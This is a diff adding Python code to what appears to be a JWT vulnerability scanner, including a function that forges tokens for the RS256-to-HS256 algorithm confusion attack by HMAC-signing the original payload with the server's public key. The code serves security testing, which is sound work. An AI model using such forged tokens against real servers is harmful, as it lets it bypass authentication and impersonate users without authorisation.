@@ -1,3 +1,46 @@
+import hmac
+import hashlib
+import base64
+import json
+
+def base64url_encode(data: bytes) -> str:
+    """Encodes bytes into a Base64Url string without padding."""
+    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')
+
+def generate_confusion_token(token: str, public_key_pem: str) -> dict:
+    """
+    Generates a forged token to test Algorithm Confusion (RS256 -> HS256).
+    It uses the server's public key as the HMAC secret.
+    """
+    parts = token.split('.')
+    if len(parts) != 3:
+        return {"error": "Invalid token format."}
+
+    try:
+        payload = parts[1] # Keep the original payload untouched
+        
+        # 1. Craft a new header forcing the HS256 algorithm
+        new_header = {"alg": "HS256", "typ": "JWT"}
+        new_header_b64 = base64url_encode(json.dumps(new_header).encode('utf-8'))
+        
+        # 2. Combine new header and original payload
+        header_payload = f"{new_header_b64}.{payload}".encode('utf-8')
+        
+        # 3. Sign using the exact string of the PUBLIC KEY as the HMAC secret
+        sig = hmac.new(public_key_pem.encode('utf-8'), header_payload, hashlib.sha256).digest()
+        new_signature = base64url_encode(sig)
+        
+        # 4. Assemble the forged token
+        forged_token = f"{new_header_b64}.{payload}.{new_signature}"
+        
+        return {
+            "success": True,
+            "forged_token": forged_token,
+            "description": "Forged token generated. If the server accepts this, it is vulnerable to Algorithm Confusion."
+        }
+    except Exception as e:
+        return {"error": str(e)}
+
 def check_static_vulnerabilities(decoded_jwt: dict) -> dict:
     """Checks the decoded JWT for common static misconfigurations."""
     vulnerabilities = []
